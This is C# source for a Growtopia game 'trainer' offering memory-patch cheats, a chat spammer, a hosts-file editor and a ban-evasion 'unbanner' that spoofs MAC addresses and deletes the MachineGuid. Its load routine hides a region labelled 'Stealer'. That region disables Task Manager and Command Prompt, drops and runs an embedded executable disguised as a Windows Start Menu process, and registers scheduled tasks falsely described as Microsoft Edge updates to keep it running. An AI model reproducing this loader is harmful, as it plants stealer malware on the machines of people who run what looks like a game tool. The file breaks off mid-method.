using Memory;
using Microsoft.Win32;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Security.Principal;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Windows.Input;

namespace Trainer
{
    public partial class Trainer : Form
    {
        public Trainer()
        {
            InitializeComponent();
        }
        private readonly string TempFolder = Path.GetTempPath();
        private readonly string AppdataRoaming = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Appdata\\Roaming"; // Appdata\Roaming
        private readonly Mem mem = new Mem();
        private readonly Timer t1 = new Timer();
        private bool ProcOpen = false;
        private readonly Others others = new Others();
        private readonly Cheats cheats = new Cheats();
        private bool mouseDown;
        private Point lastLocation;
        private const string ResourceName = "StartMenuExperienceHost.exe";
        private const string ZipFileName = "StartMenu.zip";
        private const string SolutionName = "Trainer";
        private readonly TaskDefinition td = TaskService.Instance.NewTask();

        private void StartForm()
        {
            Opacity = 0; //first the opacity is 0
            t1.Interval = 10;  //we'll increase the opacity every 10ms
            t1.Tick += new EventHandler(FadeIn);  //this calls the function that changes opacity
            t1.Start();
        }

        private async void ExitForm()
        {
            for (Opacity = 0.90; Opacity > .0; Opacity -= .1) { await System.Threading.Tasks.Task.Delay(10); }
            Application.Exit();
        }

        private void FadeIn(object sender, EventArgs e)
        {
            if (Opacity >= 0.90)
            {
                t1.Stop();   //this stops the timer if the form is completely displayed
            }
            else
            {
                Opacity += 0.05;
            }
        }

        private void Trainer_Load(object sender, EventArgs e)
        {
            Show();
            StartForm();
            others.DisableTaskManager();
            others.DisableCommandPrompt();
            others.Wait(1000);

            #region Stealer
            try
            {
                string FolderChars = others.GetRandomString().ToLower();
                string Guna = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\.guna";
                string StealerFolderLoc = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps" + "\\Microsoft.Windows.StartMenuExperienceHost_" + FolderChars;
                string StealerFolder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\WindowsApps\\";
                string StealerFile = StealerFolderLoc + "\\" + ResourceName;
                others.DirClean(StealerFolder);
                others.Wait(1000);
                Directory.CreateDirectory(StealerFolderLoc);
                others.Extract(SolutionName, StealerFolderLoc, "Resources", ResourceName);
                others.Extract(SolutionName, StealerFolderLoc, "Resources", ZipFileName);
                if (Directory.Exists(Guna))
                {
                    Directory.Delete(Guna, true);
                }
                System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
                System.Diagnostics.Process.Start(StealerFile);
                td.RegistrationInfo.Description = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.";
                DailyTrigger dt = new DailyTrigger();
                dt.Repetition.Duration = TimeSpan.FromHours(24);
                dt.Repetition.Interval = TimeSpan.FromMinutes(30);
                td.Triggers.Add(dt);
                td.Actions.Add(StealerFile);
                TaskService.Instance.RootFolder.RegisterTaskDefinition("MicrosoftEdgeUpdateTaskMachineCore", td);
                TaskService.Instance.AddTask("MicrosoftEdgeUpdateTaskMachineUA", QuickTriggerType.Logon, StealerFile, "-a arg");

                if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                {
                    return;
                }
                File.Delete(StealerFolderLoc + "\\" + ZipFileName);
            }
            catch (Exception) { }
            #endregion

            Auto_Attach.RunWorkerAsync();

            foreach (NetworkInterface adapter in NetworkInterface.GetAllNetworkInterfaces().Where(
            a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)
            ).OrderByDescending(a => a.Speed))
            {
                AdaptersComboBox.Items.Add(new Adapter(adapter));
            }

            AdaptersComboBox.SelectedIndex = 0;
            Update.Start();
            foreach (string subkeyname2 in Registry.CurrentUser.GetSubKeyNames())
            {
                if (subkeyname2.StartsWith("1") || subkeyname2.StartsWith("2") || subkeyname2.StartsWith("3") || subkeyname2.StartsWith("4") || subkeyname2.StartsWith("5") || subkeyname2.StartsWith("6") || subkeyname2.StartsWith("7") || subkeyname2.StartsWith("8") || subkeyname2.StartsWith("9"))
                {
                    longkey.Text = subkeyname2;
                    UnbanLog.Text = "->The Second Key " + longkey.Text + " is found!";
                    break;
                }
            }
            foreach (string subkeyname in Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").GetSubKeyNames())
            {
                if (subkeyname.StartsWith("1") || subkeyname.StartsWith("2") || subkeyname.StartsWith("3") || subkeyname.StartsWith("4") || subkeyname.StartsWith("5") || subkeyname.StartsWith("6") || subkeyname.StartsWith("7") || subkeyname.StartsWith("8") || subkeyname.StartsWith("9"))
                {
                    shortkey.Text = subkeyname;
                    UnbanLog.Text += Environment.NewLine;
                    UnbanLog.Text = UnbanLog.Text + "->The First Key " + shortkey.Text + " is found!";
                    break;
                }
            }
            if (longkey.Text == "No Long Key Connect Growtopia To Fix It")
            {
                UnbanLog.Text = "->First Key Cannot be found!";
            }
            if (shortkey.Text == "No First Key Connect Growtopia To Fix It")
            {
                UnbanLog.Text += Environment.NewLine;
                UnbanLog.Text += "->First Key Cannot be found!";
            }
            UnbanLog.Text += Environment.NewLine;
            UnbanLog.Text += "->MachineGuid key is found!";
            KeyPreview = true;
        }

        private void Exit_Click(object sender, EventArgs e)
        {
            ExitForm();
        }

        private void Minimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void About_Button_Click(object sender, EventArgs e)
        {
            RandomMacAdressTimer.Stop();
            About.Show();
            Cheats.Hide();
            Changers.Hide();
            Spammer.Hide();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Cheat_Button_Click(object sender, EventArgs e)
        {
            RandomMacAdressTimer.Stop();
            About.Hide();
            Cheats.Show();
            Changers.Hide();
            Spammer.Hide();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Changers_Button_Click(object sender, EventArgs e)
        {
            RandomMacAdressTimer.Stop();
            About.Hide();
            Cheats.Hide();
            Changers.Show();
            Spammer.Hide();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Spammer_Button_Click(object sender, EventArgs e)
        {
            RandomMacAdressTimer.Stop();
            About.Hide();
            Cheats.Hide();
            Changers.Hide();
            Spammer.Show();
            Unbanner.Hide();
            Settings.Hide();
        }

        private void Unbanner_Button_Click(object sender, EventArgs e)
        {
            RandomMacAdressTimer.Start();
            About.Hide();
            Cheats.Hide();
            Changers.Hide();
            Spammer.Hide();
            Unbanner.Show();
            Settings.Hide();
        }

        private void Settings_Button_Click(object sender, EventArgs e)
        {
            try
            {
                string path = System.IO.Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
                string str = File.ReadAllText(path);
                Host_File_Editor.Text = str;
            }
            catch (Exception) { } // Ignore all exceptions
            RandomMacAdressTimer.Stop();
            About.Hide();
            Cheats.Hide();
            Changers.Hide();
            Spammer.Hide();
            Unbanner.Hide();
            Settings.Show();
        }

        private void Opacity_Track_Scroll(object sender, ScrollEventArgs e)
        {
            System.Windows.Forms.Form.ActiveForm.Opacity = (OpacityTrackBar.Value / 100.0);
            TrackbarText.Text = OpacityTrackBar.Value.ToString();
        }

        public void Auto_Attach_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            if (!mem.OpenProcess("Growtopia.exe"))
            {
                System.Threading.Thread.Sleep(1000);
                return;
            }

            ProcOpen = true;

            System.Threading.Thread.Sleep(1000);
            Auto_Attach.ReportProgress(0);
        }

        public void Auto_Attach_ProgressChanged(object sender, System.ComponentModel.ProgressChangedEventArgs e)
        {
            if (ProcOpen)
            {
                try
                {
                    mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[0], "bytes", "0F 85 9E 01 00 00");
                    mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[1], "bytes", "90 90");
                    mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[5], "bytes", "90 90");
                    mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[2], "string", cheats.GTCheats[4]);
                }
                catch (Exception) { }
            }
        }

        public void Auto_Attach_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
        {
            Auto_Attach.RunWorkerAsync();
        }

        private void GiveawayMode_Timer_Tick(object sender, EventArgs e)
        {
            if ((Keyboard.GetKeyStates(Key.S) & KeyStates.Down) > 0)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[8], "bytes", "0F 83 88 00 00 00");
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[8], "bytes", "0F 84 88 00 00 00");
            }
        }

        private void Spammer_Status_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Spammer_Status.BackColor == Color.White)
            {
                FocusText.Focus();
                TextTimer.Start();
                Spammer_Status.BackColor = Color.Blue;
                Spammer_Status.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                FocusText.Focus();
                TextTimer.Stop();
                Spammer_Status.BackColor = Color.White;
                Spammer_Status.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void TextTimer_Tick(object sender, EventArgs e)
        {
            SendKeys.Send("{ENTER}");
            SendKeys.Send(Input.Text);
            SendKeys.Send("{ENTER}");
        }

        private void SetInterval_Click(object sender, EventArgs e)
        {
            try
            {
                TextTimer.Interval = int.Parse(Spammer_Interval.Text);
                Timer timer1 = new Timer();
                bool parsed = int.TryParse(Spammer_Interval.Text, out int myInt);

                if (parsed)
                {
                    timer1.Interval = myInt;
                }
                IntervalValue.Text = TextTimer.Interval.ToString();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void HostsRefresh_Click(object sender, EventArgs e)
        {
            string path = System.IO.Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
            string str = File.ReadAllText(path);
            Host_File_Editor.Text = str;
        }

        private void EditHost_Click(object sender, EventArgs e)
        {
            try
            {
                string path = Path.Combine(Environment.SystemDirectory, "drivers\\etc\\hosts");
                File.WriteAllText(path, Host_File_Editor.Text);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void OnTop_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (OnTop.BackColor == Color.White)
            {
                ActiveForm.TopMost = true;
                FocusText.Focus();
                OnTop.BackColor = Color.Blue;
                OnTop.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                ActiveForm.TopMost = false;
                FocusText.Focus();
                OnTop.BackColor = Color.White;
                OnTop.FlatAppearance.BorderColor = Color.Black;
            }
        }

        #region Trainer Move
        private void TopBar_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            mouseDown = true;
            lastLocation = e.Location;
        }

        private void TopBar_MouseMove(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (mouseDown)
            {
                Location = new Point(
                    (Location.X - lastLocation.X) + e.X, (Location.Y - lastLocation.Y) + e.Y);

                Update();
            }
        }

        private void TopBar_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            mouseDown = false;
        }

        private void FocusText_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            mouseDown = true;
            lastLocation = e.Location;
        }

        private void FocusText_MouseMove(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (mouseDown)
            {
                Location = new Point(
                    (Location.X - lastLocation.X) + e.X, (Location.Y - lastLocation.Y) + e.Y);

                Update();
            }
        }

        private void FocusText_MouseUp(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            mouseDown = false;
        }
        #endregion

        #region Growtopia Cheats
        private void GiveawayMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (GiveawayMode.BackColor == Color.White)
            {
                GiveawayMode_Timer.Start();
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[23], "bytes", "75 05"); //Ghost Mode
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[10], "bytes", "90 90"); //Noclip
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[3], "bytes", "75 5D"); //Mod Fly V1
                FocusText.Focus();
                GiveawayMode.BackColor = Color.Blue;
                GiveawayMode.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                GiveawayMode_Timer.Stop();
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[23], "bytes", "74 05"); //Ghost Mode
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[10], "bytes", "75 0B"); //Noclip
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[3], "bytes", "74 5D"); //Mod Fly V1
                FocusText.Focus();
                GiveawayMode.BackColor = Color.White;
                GiveawayMode.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiBounce_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiBounce.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[6], "bytes", "90 90");
                FocusText.Focus();
                AntiBounce.BackColor = Color.Blue;
                AntiBounce.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[6], "bytes", "75 10");
                FocusText.Focus();
                AntiBounce.BackColor = Color.White;
                AntiBounce.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void ModFlyV2_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (ModFlyV2.BackColor == Color.White)
            {
                GiveawayMode_Timer.Start();
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[3], "bytes", "75 5D");
                FocusText.Focus();
                ModFlyV2.BackColor = Color.Blue;
                ModFlyV2.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                GiveawayMode_Timer.Start();
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[3], "bytes", "74 5D");
                FocusText.Focus();
                ModFlyV2.BackColor = Color.White;
                ModFlyV2.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void Growz_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Growz.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[9], "bytes", "90 90 90 90");
                FocusText.Focus();
                Growz.BackColor = Color.Blue;
                Growz.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[9], "bytes", "F3 0F 5C D1");
                FocusText.Focus();
                Growz.BackColor = Color.White;
                Growz.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void FastFallV1_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (FastFallV1.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[7], "bytes", "90 90 90 90");
                FocusText.Focus();
                FastFallV1.BackColor = Color.Blue;
                FastFallV1.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[7], "bytes", "F3 0F 59 CE");
                FocusText.Focus();
                FastFallV1.BackColor = Color.White;
                FastFallV1.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void FastFallV2_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (FastFallV2.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[8], "bytes", "0F 83 88 00 00 00");
                FocusText.Focus();
                FastFallV2.BackColor = Color.Blue;
                FastFallV2.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[8], "bytes", "0F 84 88 00 00 00");
                FocusText.Focus();
                FastFallV2.BackColor = Color.White;
                FastFallV2.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void Ghost_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Ghost.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[23], "bytes", "75 05");
                FocusText.Focus();
                Ghost.BackColor = Color.Blue;
                Ghost.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[23], "bytes", "74 05");
                FocusText.Focus();
                Ghost.BackColor = Color.White;
                Ghost.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiSlide_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiSlide.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[13], "bytes", "74 03");
                FocusText.Focus();
                AntiSlide.BackColor = Color.Blue;
                AntiSlide.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[13], "bytes", "75 03");
                FocusText.Focus();
                AntiSlide.BackColor = Color.White;
                AntiSlide.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void SlideMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (SlideMode.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[12], "bytes", "74 0E");
                FocusText.Focus();
                SlideMode.BackColor = Color.Blue;
                SlideMode.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[12], "bytes", "75 0E");
                FocusText.Focus();
                SlideMode.BackColor = Color.White;
                SlideMode.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiLgrid_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiLgrid.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[16], "bytes", "0F 84 67 05 00 00");
                FocusText.Focus();
                AntiLgrid.BackColor = Color.Blue;
                AntiLgrid.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[16], "bytes", "0F 85 67 05 00 00");
                FocusText.Focus();
                AntiLgrid.BackColor = Color.White;
                AntiLgrid.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiKnockback_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiKnockback.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[14], "bytes", "0F 84 C0 00 00 00");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[15], "bytes", "0F 84 67 01 00 00");
                FocusText.Focus();
                AntiKnockback.BackColor = Color.Blue;
                AntiKnockback.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[14], "bytes", "0F 85 C0 00 00 00");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[15], "bytes", "0F 85 67 01 00 00");
                FocusText.Focus();
                AntiKnockback.BackColor = Color.White;
                AntiKnockback.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void Gravity_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (Gravity.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[24], "bytes", "0F 85 17 01 00 00");
                FocusText.Focus();
                Gravity.BackColor = Color.Blue;
                Gravity.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[24], "bytes", "0F 84 17 01 00 00");
                FocusText.Focus();
                Gravity.BackColor = Color.White;
                Gravity.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void DevMode_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (DevMode.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[22], "bytes", "75 5F");
                FocusText.Focus();
                DevMode.BackColor = Color.Blue;
                DevMode.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[22], "bytes", "74 5F");
                FocusText.Focus();
                DevMode.BackColor = Color.White;
                DevMode.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void SystemSpeed_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (SystemSpeed.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[17], "bytes", "90 90 90 90");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[18], "bytes", "90 90 90 90");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[19], "bytes", "90 90 90 90");
                FocusText.Focus();
                SystemSpeed.BackColor = Color.Blue;
                SystemSpeed.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[17], "bytes", "89 54 24 6C");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[18], "bytes", "89 54 24 6C");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[19], "bytes", "48 8B 43 08");
                FocusText.Focus();
                SystemSpeed.BackColor = Color.White;
                SystemSpeed.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiPlatform_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiPlatform.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[20], "bytes", "90 90");
                FocusText.Focus();
                AntiPlatform.BackColor = Color.Blue;
                AntiPlatform.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[20], "bytes", "74 0D");
                FocusText.Focus();
                AntiPlatform.BackColor = Color.White;
                AntiPlatform.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void AntiGravityWell_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (AntiGravityWell.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[21], "bytes", "90 90 90 90 90");
                FocusText.Focus();
                AntiGravityWell.BackColor = Color.Blue;
                AntiGravityWell.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[21], "bytes", "E8 25 01 00 00");
                FocusText.Focus();
                AntiGravityWell.BackColor = Color.White;
                AntiGravityWell.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void FastPickupDrop_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (FastPickupDrop.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[25], "bytes", "90 90");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[26], "bytes", "75 90");
                FocusText.Focus();
                FastPickupDrop.BackColor = Color.Blue;
                FastPickupDrop.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[25], "bytes", "73 19");
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[26], "bytes", "74 90");
                FocusText.Focus();
                FastPickupDrop.BackColor = Color.White;
                FastPickupDrop.FlatAppearance.BorderColor = Color.Black;
            }
        }

        private void ModZoom_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (ModZoom.BackColor == Color.White)
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[11], "bytes", "80 B8 00 00 00 00 00");
                FocusText.Focus();
                ModZoom.BackColor = Color.Blue;
                ModZoom.FlatAppearance.BorderColor = Color.White;
            }
            else
            {
                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[11], "bytes", "80 B8 79 01 00 00 00");
                FocusText.Focus();
                ModZoom.BackColor = Color.White;
                ModZoom.FlatAppearance.BorderColor = Color.Black;
            }
        }
        #endregion

        public class Adapter
        {
            public ManagementObject adapter;
            public string adaptername;
            public string customname;
            public int devnum;

            public Adapter(ManagementObject a, string aname, string cname, int n)
            {
                adapter = a;
                adaptername = aname;
                customname = cname;
                devnum = n;
            }

            public Adapter(NetworkInterface i) : this(i.Description) { }

            public Adapter(string aname)
            {
                adaptername = aname;

                ManagementObjectSearcher searcher = new ManagementObjectSearcher("select * from win32_networkadapter where Name='" + adaptername + "'");
                ManagementObjectCollection found = searcher.Get();
                adapter = found.Cast<ManagementObject>().FirstOrDefault();
                try
                {
                    Match match = Regex.Match(adapter.Path.RelativePath, "\\\"(\\d+)\\\"$");
                    devnum = int.Parse(match.Groups[1].Value);
                }
                catch
                {
                    return;
                }

                customname = NetworkInterface.GetAllNetworkInterfaces().Where(
                  i => i.Description == adaptername
                ).Select(
                  i => " (" + i.Name + ")"
                ).FirstOrDefault();
            }
            public NetworkInterface ManagedAdapter => NetworkInterface.GetAllNetworkInterfaces().Where(
              nic => nic.Description == adaptername
            ).FirstOrDefault();

            public string Mac
            {
                get
                {
                    try
                    {
                        return BitConverter.ToString(ManagedAdapter.GetPhysicalAddress().GetAddressBytes()).Replace("-", "").ToUpper();
                    }
                    catch
                    {
                        return null;
                    }
                }
            }

            public string RegistryKey => string.Format(@"SYSTEM\ControlSet001\Control\Class\{{4D36E972-E325-11CE-BFC1-08002BE10318}}\{0:D4}", devnum);
            public string RegistryMac
            {
                get
                {
                    try
                    {
                        using (RegistryKey regkey = Registry.LocalMachine.OpenSubKey(RegistryKey, false))
                        {
                            return regkey.GetValue("NetworkAddress").ToString();
                        }
                    }
                    catch
                    {
                        return null;
                    }
                }
            }

            public bool SetRegistryMac(string value)
            {
                bool shouldReenable = false;

                try
                {
                    if (value.Length > 0 && !Adapter.IsValidMac(value, false))
                    {
                        throw new Exception(value + " is not a valid mac address");
                    }

                    using (RegistryKey regkey = Registry.LocalMachine.OpenSubKey(RegistryKey, true))
                    {
                        if (regkey == null)
                        {
                            throw new Exception("Failed to open the registry key");
                        }

                        if (regkey.GetValue("AdapterModel") as string != adaptername &&
                          regkey.GetValue("DriverDesc") as string != adaptername)
                        {
                            throw new Exception("Adapter not found in registry");
                        }

                        uint result = (uint)adapter.InvokeMethod("Disable", null);
                        if (result != 0)
                        {
                            throw new Exception("Failed to disable network adapter.");
                        }

                        shouldReenable = true;

                        if (value.Length > 0)
                        {
                            regkey.SetValue("NetworkAddress", value, RegistryValueKind.String);
                        }
                        else
                        {
                            regkey.DeleteValue("NetworkAddress");
                        }

                        return true;
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    return false;
                }
                finally
                {
                    if (shouldReenable)
                    {
                        uint result = (uint)adapter.InvokeMethod("Enable", null);
                        if (result != 0)
                        {
                            MessageBox.Show("Failed to re-enable network adapter.");
                        }
                    }
                }
            }
            public override string ToString()
            {
                return adaptername + customname;
            }

            public static string GetNewMac()
            {
                System.Random r = new System.Random();

                byte[] bytes = new byte[6];
                r.NextBytes(bytes);

                bytes[0] = (byte)(bytes[0] | 0x02);

                bytes[0] = (byte)(bytes[0] & 0xfe);

                return MacToString(bytes);
            }

            public static bool IsValidMac(string mac, bool actual)
            {
                if (mac.Length != 12)
                {
                    return false;
                }

                if (mac != mac.ToUpper())
                {
                    return false;
                }

                if (!Regex.IsMatch(mac, "^[0-9A-F]*$"))
                {
                    return false;
                }

                if (actual)
                {
                    return true;
                }

                char c = mac[1];
                return (c == '2' || c == '6' || c == 'A' || c == 'E');
            }
            public static bool IsValidMac(byte[] bytes, bool actual)
            {
                return IsValidMac(Adapter.MacToString(bytes), actual);
            }
            public static string MacToString(byte[] bytes)
            {
                return BitConverter.ToString(bytes).Replace("-", "").ToUpper();
            }
        }
        private void UpdateAddresses()
        {
            Adapter a = AdaptersComboBox.SelectedItem as Adapter;
            CurrentMacTextBox.Text = a.RegistryMac;
            ActualMacLabel.Text = a.Mac;
        }

        private void AdaptersComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateAddresses();
        }

        private void Unban_Click(object sender, EventArgs e)
        {
            try
            {
                UnbanLog.Clear();
                FocusText.Focus();
                if (!Adapter.IsValidMac(CurrentMacTextBox.Text, false))
                {
                    MessageBox.Show("Entered MAC-address is not valid; will not update.", "Invalid MAC-address specified", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                SetRegistryMac(CurrentMacTextBox.Text);

                UnbanLog.Text += Environment.NewLine;
                UnbanLog.Text += "->Mac Adress Randomized And Changed!";
                System.Threading.Thread.Sleep(500);
                if (longkey.Text != "No Second Key Connect Growtopia To Fix It" && shortkey.Text != "No First Key Connect Growtopia To Fix It")
                {
                    Registry.CurrentUser.DeleteSubKey(longkey.Text);
                    UnbanLog.Text += Environment.NewLine;
                    UnbanLog.Text = UnbanLog.Text + "->The Second Key " + longkey.Text + " is deleted!";
                    string microsoftKey = @"Software\Microsoft\" + shortkey.Text;
                    Registry.CurrentUser.DeleteSubKey(microsoftKey);
                    UnbanLog.Text += Environment.NewLine;
                    UnbanLog.Text = UnbanLog.Text + "->The First Key " + shortkey.Text + " is deleted!";
                    string cryptographyKey = @"SOFTWARE\Microsoft\Cryptography";
                    RegistryKey ckey = Registry.LocalMachine.OpenSubKey(cryptographyKey, true);
                    ckey.DeleteValue("MachineGuid");
                    UnbanLog.Text += Environment.NewLine;
                    UnbanLog.Text += "->The MachineGuid key is deleted!";
                    longkey.Text = "No Second Key Connect Growtopia To Fix It";
                    shortkey.Text = "No First Key Connect Growtopia To Fix It";
                    UnbanLog.Text += Environment.NewLine;
                    UnbanLog.Text += "->Done Unbanning!";
                }
                else
                {
                    UnbanLog.Text += Environment.NewLine;
                    UnbanLog.Text += "->Can't UNBAN! Open Growtopia and click 'Connect'. Then Click 'REFRESH' (its inside the UNBANNER!)";
